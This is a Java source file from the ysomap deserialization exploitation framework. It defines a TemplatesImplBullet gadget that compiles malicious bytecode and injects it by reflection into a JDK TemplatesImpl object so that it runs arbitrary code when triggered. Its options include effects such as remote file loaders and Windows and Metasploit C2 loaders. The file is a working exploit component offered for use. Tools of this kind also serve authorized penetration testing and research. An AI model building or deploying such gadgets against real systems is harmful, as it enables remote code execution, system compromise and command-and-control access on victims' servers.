package ysomap.bullets.jdk;


import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import ysomap.bullets.AbstractBullet;
import ysomap.bullets.Bullet;
import ysomap.bullets.objects.ClassWithExistEviClass;
import ysomap.common.annotation.*;
import ysomap.core.util.DetailHelper;
import ysomap.core.util.ReflectionHelper;

import java.io.Serializable;
import java.util.UUID;

/**
 * 编译恶意类，并填充到TemplatesImpl
 *
 * @author wh1t3P1g
 * @since 2020/2/17
 */
@SuppressWarnings({"rawtypes"})
@Bullets
@Dependencies({"jdk"})
@Authors({ Authors.WH1T3P1G })
@Targets({Targets.JDK})
@Details("载入恶意class字节码，并执行任意代码，依赖TemplatesImpl")
public class TemplatesImplBullet extends AbstractBullet<Object> {

    private Class templatesImpl;
    private Class abstractTranslet;
    private Class transformerFactoryImpl;

    @NotNull
    @Require(name = "body" ,detail = DetailHelper.BODY)
    private String body = "";

    @NotNull
    @Require(name = "effect", type = "string", detail="选择载入payload的效果，" +
            "可选default、SpecialRuntimeExecutor、" +
            "TomcatEcho、SocketEcho、RemoteFileLoader、WinC2Loader、MSFJavaC2Loader、" +
            "RemoteFileHttpLoader、RemoteFileHttpExecutor、DnslogLoader、CustomizableClassLoader")
    private String effect = "default";

    @Require(name = "exception", type = "boolean", detail = "是否需要以抛异常的方式返回执行结果，默认为false")
    private String exception = "false";

    public String action = "outputProperties";

    @Override
    public Object getObject() throws Exception {
        initClazz();
        // create evil bytecodes
        byte[] bytecodes = makeEvilByteCode(body);
        // arm evil bytecodes
        Object templates = templatesImpl.newInstance();
        // inject class bytes into instance
        ReflectionHelper.setFieldValue(templates, "_bytecodes", new byte[][] { bytecodes });
        ReflectionHelper.setFieldValue(templates, "_name", UUID.randomUUID().toString());
        ReflectionHelper.setFieldValue(templates, "_tfactory", transformerFactoryImpl.newInstance());
        return templates;
    }

    private byte[] makeEvilByteCode(String body) throws Exception {
        Bullet bullet = new ClassWithExistEviClass();
        bullet.set("body", body);
        bullet.set("effect", effect);
        bullet.set("type", "class");
        bullet.set("exception", exception);
        bullet.set("superClass", abstractTranslet);
        return (byte[]) bullet.getObject();
    }

    private void initClazz() throws ClassNotFoundException {
        if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
            templatesImpl = Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
            abstractTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
            transformerFactoryImpl = Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl");
        } else {
            templatesImpl = TemplatesImpl.class;
            abstractTranslet = AbstractTranslet.class;
            transformerFactoryImpl = TransformerFactoryImpl.class;
        }
    }

    public static class StubTransletPayload extends AbstractTranslet implements Serializable {

        private static final long serialVersionUID = -5971610431559700674L;

        public StubTransletPayload(){
            transletVersion = 101;
        }

        public void transform (DOM document, SerializationHandler[] handlers ) throws TransletException {}

        @Override
        public void transform (DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
    }


    public static Bullet newInstance(Object... args) throws Exception {
        Bullet bullet = new TemplatesImplBullet();
        bullet.set("effect", args[0]);
        bullet.set("body", args[1]);
        bullet.set("exception", args[2]);
        return bullet;
    }

}
